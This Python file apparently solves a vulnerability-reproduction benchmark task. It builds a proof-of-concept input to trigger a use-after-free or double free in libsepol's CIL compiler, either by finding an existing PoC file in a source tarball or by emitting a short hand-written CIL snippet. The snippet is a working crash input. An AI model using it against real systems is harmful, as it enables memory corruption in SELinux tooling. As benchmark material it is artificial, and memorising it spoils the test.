import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the heap use-after-free / double free
        in libsepol/cil by creating an anonymous classpermission that is
        passed to a macro using a classpermissionset rule.
        """
        poc = self._extract_poc_from_tar(src_path)
        if poc is not None:
            return poc

        # Fallback: hand-crafted CIL PoC based on CIL language semantics
        fallback_poc = """
(class myclass (read write))

(macro cp_macro ((classpermission cp))
    (classpermissionset mycps (cp))
)

(call cp_macro
    ((classpermission (myclass (read))))
)
"""
        return fallback_poc.lstrip().encode("ascii")

    def _extract_poc_from_tar(self, src_path: str) -> bytes | None:
        """
        Try to locate an existing PoC CIL file inside the source tarball.
        Prefer files that:
          - Look like CIL (S-expression style)
          - Contain 'classpermission', 'classpermissionset', 'macro', and 'call'
        """
        try:
            with tarfile.open(src_path, "r:*") as tf:
                candidates = []

                for member in tf.getmembers():
                    if not member.isfile():
                        continue

                    name_lower = member.name.lower()
                    # Prioritize .cil files
                    if not (name_lower.endswith(".cil") or "/cil/" in name_lower):
                        continue

                    # Skip huge files
                    if member.size > 65536:
                        continue

                    f = tf.extractfile(member)
                    if f is None:
                        continue
                    data = f.read()
                    if not data:
                        continue

                    # Heuristic: must be decodable text
                    try:
                        text = data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue

                    score = self._score_cil_text(text)
                    if score > 0:
                        distance = abs(len(data) - 340)
                        candidates.append((score, distance, len(data), data))

                if not candidates:
                    return None

                # Pick candidate with highest score; tiebreaker: closest to 340 bytes, then shortest
                candidates.sort(key=lambda x: (-x[0], x[1], x[2]))
                best_score, _, _, best_data = candidates[0]

                # Require a reasonably high score so we don't accidentally pick non-PoC files
                if best_score >= 8:
                    return best_data

                return None
        except Exception:
            return None

    def _score_cil_text(self, text: str) -> int:
        """
        Heuristic scoring: how likely is this text to be the desired PoC?
        """
        # Quick rejection: must have parentheses and at least one CIL-like form
        if "(" not in text or ")" not in text:
            return 0

        score = 0

        # Prefer explicit S-expression uses
        if "(classpermission" in text:
            score += 3
        elif "classpermission" in text:
            score += 1

        if "(classpermissionset" in text:
            score += 5
        elif "classpermissionset" in text:
            score += 2

        if "(macro" in text:
            score += 4
        elif "macro" in text:
            score += 1

        if "(call" in text:
            score += 3
        elif "call" in text:
            score += 1

        # Extra hints
        if "anonymous" in text:
            score += 2
        if "double free" in text or "use after free" in text or "use-after-free" in text:
            score += 2

        # Look for overall CIL structure (many '(' at line starts)
        paren_start_lines = len(re.findall(r'^\s*\(', text, flags=re.MULTILINE))
        if paren_start_lines >= 3:
            score += 2

        return score